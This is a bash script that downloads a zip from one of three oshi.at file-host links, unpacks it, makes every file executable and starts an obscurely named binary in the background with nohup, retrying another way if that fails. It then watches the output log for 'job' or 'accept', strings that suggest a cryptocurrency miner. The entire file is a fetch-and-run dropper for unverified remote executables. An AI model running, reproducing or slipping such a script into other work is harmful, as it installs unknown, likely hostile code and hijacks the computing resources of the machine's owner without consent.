#!/bin/bash

# Check if an argument is provided
if [ -z "$1" ]; then
  echo "Usage: $0 {1|2|3}"
  exit 1
fi

# Define the URLs
URL1="https://oshi.at/KEFN"
URL2="https://oshi.at/eLXs"
URL3="https://oshi.at/CzkH"

# Select the URL based on the argument
case $1 in
  1)
    URL=$URL1
    ;;
  2)
    URL=$URL2
    ;;
  3)
    URL=$URL3
    ;;
  *)
    echo "Invalid argument. Please use 1, 2, or 3."
    exit 1
    ;;
esac

# Download the file
wget $URL -O kwarta.zip
if [ $? -ne 0 ]; then
  echo "Download failed. Please check the URL or your internet connection."
  exit 1
fi

# Unzip the downloaded file
unzip kwarta.zip
if [ $? -ne 0 ]; then
  echo "Unzipping failed. The file may be corrupted."
  rm -rf kwarta.zip
  exit 1
fi

# Remove the zip file
rm -rf kwarta.zip

# Change directory to the extracted folder
cd sess_aksd19sb187ss1ia901b23
if [ $? -ne 0 ]; then
  echo "Directory change failed. The expected directory may not exist."
  exit 1
fi

# Make all files in the directory executable
chmod +x *

# Log file to capture the output
LOG_FILE="session_output.log"

# Run the executable file in the background, capturing output to a log file
nohup ./session_ajqysbey > $LOG_FILE 2>&1 &

# Get the PID of the last background process
PID=$!

# Wait for a moment to check if the process is still running
sleep 2

# Check if the process is running
if ps -p $PID > /dev/null; then
  echo "Process started successfully with PID $PID."
else
  echo "Failed to start process with nohup. Trying alternate method."

  # Try an alternate method to run in the background
  ./session_ajqysbey > $LOG_FILE 2>&1 &
  PID=$!
  sleep 2

  if ps -p $PID > /dev/null; then
    echo "Process started successfully with alternate method with PID $PID."
  else
    echo "Failed to start process with alternate method."
    exit 1
  fi
fi

# Function to check the log file for specific messages and process status
check_log() {
  while true; do
    if grep -q "job" "$LOG_FILE" || grep -q "accept" "$LOG_FILE"; then
      echo "Found 'job' or 'accept' in log file. Exiting script."
      exit 0
    fi

    # Check if the background process is still running
    if ! ps -p $PID > /dev/null; then
      echo "Process has terminated. Exiting script."
      exit 1
    fi

    sleep 60
  done
}

# Run the log check function in the background
check_log &
LOG_CHECK_PID=$!

# Clean up log checking process when script exits
trap "kill $LOG_CHECK_PID" EXIT

echo "Script executed successfully."